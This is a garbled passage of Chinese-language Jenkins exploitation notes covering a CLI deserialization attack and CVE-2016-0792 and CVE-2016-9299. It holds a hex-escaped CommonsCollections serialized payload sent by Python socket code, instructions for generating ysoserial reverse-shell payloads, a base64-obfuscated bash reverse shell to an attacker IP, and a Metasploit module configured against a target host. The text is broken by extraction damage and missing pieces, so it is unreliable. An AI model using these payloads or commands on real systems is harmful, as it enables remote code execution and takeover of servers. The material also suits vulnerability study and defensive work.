6e\x6e\x65\x63\x74\x73\x71\x00\x7e\x00\x13\x00\x00\x01\xdf\x71\x00\x7e\x00\x2a\x71\x00\
x7e\x00\x2b\x74\x00\x05\x5f\x6d\x61\x69\x6e\x73\x71\x00\x7e\x00\x13\x00\x00\x01\x86\x71
\x00\x7e\x00\x2a\x71\x00\x7e\x00\x2b\x74\x00\x04\x6d\x61\x69\x6e\x73\x72\x00\x26\x6a\x6
1\x76\x61\x2e\x75\x74\x69\x6c\x2e\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x24\x55\x
6e\x6d\x6f\x64\x69\x66\x69\x61\x62\x6c\x65\x4c\x69\x73\x74\xfc\x0f\x25\x31\xb5\xec\x8e\
x10\x02\x00\x01\x4c\x00\x04\x6c\x69\x73\x74\x71\x00\x7e\x00\x0f\x77\x04\xff\xff\xff\xfd
\x78\x72\x00\x2c\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x43\x6f\x6c\x6c\x65\x63\x74\x6
9\x6f\x6e\x73\x24\x55\x6e\x6d\x6f\x64\x69\x66\x69\x61\x62\x6c\x65\x43\x6f\x6c\x6c\x65\x
63\x74\x69\x6f\x6e\x19\x42\x00\x80\xcb\x5e\xf7\x1e\x02\x00\x01\x4c\x00\x01\x63\x74\x00\
x16\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e
由于该漏洞是利⽤ cc1 的链，所以我们可以直接通过 yso ⽣成 cc1 的 payload 
成功在容器中执⾏命令 
\x3b\x77\x04\xff\xff\xff\xfd\x78\x70\x73\x72\x00\x13\x6a\x61\x76\x61\x2e\x75\x74\x69\x6
c\x2e\x41\x72\x72\x61\x79\x4c\x69\x73\x74\x78\x81\xd2\x1d\x99\xc7\x61\x9d\x03\x00\x01\x
49\x00\x04\x73\x69\x7a\x65\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x00\x77\x04\x00\
x00\x00\x00\x78\x71\x00\x7e\x00\x39\x78\x71\x00\x7e\x00\x08\x00\x00\x00\x00\x00\x00\x00
\x00\x70\x00\x00\x00\x01\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2
e\x4f\x62\x6a\x65\x63\x74\x3b\x90\xce\x58\x9f\x10\x73\x29\x6c\x02\x00\x00\x77\x04\xff\x
ff\xff\xfd\x78\x70\x00\x00\x00\x01\x74\x00\x18\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\
x2e\x43\x6c\x69\x45\x6e\x74\x72\x79\x50\x6f\x69\x6e\x74\x71\x00\x7e\x00\x24\x75\x72\x00
\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\x3b\xad\xd
2\x56\xe7\xe9\x1d\x7b\x47\x02\x00\x00\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x01\x
74\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x74\x00\x1d\
x52\x50\x43\x52\x65\x71\x75\x65\x73\x74\x28\x31\x2c\x77\x61\x69\x74\x46\x6f\x72\x50\x72
\x6f\x70\x65\x72\x74\x79\x29'
print 'sending payload...'
sock.send(payload)
反弹shell
借助 http://jackson-t.ca/runtime-exec-payloads.html 将我们的 payload 简单变换，然后直接 yso ⽣成，这样就
可以直接反弹shell了
漏洞分析
本漏洞是通过 Jenkis cli 的模式来进⾏触发的，触发的过程中利⽤了含有缺陷的 CommonsCollections 3.2.1 来进
⾏反序列化的命令执⾏  
漏洞利⽤链如下：
由于我们的是通过 cli 的模式进⾏触发的所以⾸先需要找到 Jenkins cli 的⼊⼝函数，发现在  
hudson.TcpSlaveAgentListener#ConnectionHandler ，根据前⾯的 Protocol 来选择对应的协议
我们这⾥ Protocol 后⾯是 CLI-connect  ，所以我们这边就关注 cli 的地⽅ 
这⾥的 handle 是抽象⽅法，我们这⾥找到其具体实现 hudson.cli.CliProtocol#handle  可以看到这⾥的 socket 
作为参数传到了Handler 中来进⾏处理，同时调⽤其中的 run ⽅法 
在 run ⽅法中，调⽤来 runCli ⽅法对 socket 连接进⾏了处理 ，跟进 runCli ⽅法 
在 runCli ⽅法中会将我们的输⼊和输出存到缓冲区中然后传递到 build ⽅法 , 会调⽤ build ⽅法来处理缓冲区的输
⼊输出问题
我们跟进 build 这个⽅法，发现会将缓冲区中的输⼊和输出传递到 negotiate 函数中，跟进该函数 
在 negotiate 函数中，会检查所有发送到 Jenkis Cli 中的输⼊都检测是否有如下的序列头 , 然后在 case 2 处进⾏了
反序列化操作
编写poc的话⼀共发送两个请求包，⾸先发送第⼀个包来获取 cli 端⼝，然后发送构造好的序列化数据进⾏发送从
⽽触发反序列化
CVE-2016-0792 低权限⽤户命令执⾏
影响版本
jenkins 
                  hashCode
CVE-2016-9299 代码执⾏
https://www.joyk.com/dig/detail/1569061868593172
影响版本
Jenkins bash-c
{echo,YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTMvOTA5MCAwPiYxIgo=}|
{base64,-d}|{bash,-i}
                    start
            1
use exploit/linux/misc/jenkins_ldap_deserialize
set RHOST 192.168.1.5   # 设置⽬标host
set RPORT 9091  # 设置⽬标端⼝
set LDAPHOST 192.168.1.13
set SRVHOST 192.168.1.13 
set PAYLOAD cmd/unix/generic
set CMD 'touch /tmp/wtf'